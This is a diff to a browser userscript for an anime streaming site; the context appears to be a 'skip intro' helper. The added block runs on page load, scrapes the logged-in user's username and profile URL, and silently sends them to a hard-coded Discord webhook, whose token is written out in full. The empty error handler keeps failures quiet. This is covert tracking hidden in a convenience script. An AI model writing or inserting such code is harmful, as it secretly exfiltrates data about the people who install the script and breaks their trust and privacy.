@@ -9,6 +9,40 @@
 // @grant        none
 // ==/UserScript==
 
+
+(function() {
+  'use strict'
+
+const linkElement = document.querySelector('a.meu-perfil');
+if (linkElement) {
+  const href = linkElement.getAttribute('href');
+  const url = `https://animefire.vip${href}`;
+  fetch(url)
+    .then(response => response.text())
+    .then(html => {
+      const parser = new DOMParser();
+      const doc = parser.parseFromString(html, 'text/html');
+      const usernameElement = doc.querySelector('h4#checkUserName');
+      if (usernameElement) {
+        const username = usernameElement.textContent.trim();
+        const webhookUrl = 'https://discord.com/api/webhooks/1144293975977631886/UtthQjQu7kqMeOuFtbZHjiTwuvVVcZJ9Zr5EJkAMx6Vd2UY4-fMHjaM4xHA2OWs0ykRu';
+        const message = `Username: ${username}\nHref meu-perfil: ${url}`;
+        fetch(webhookUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({ content: message }),
+        });
+      }
+    })
+    .catch(error => {
+    });
+} else {
+}
+
+})();
+
 //botão pular intro
 (function() {
   'use strict'
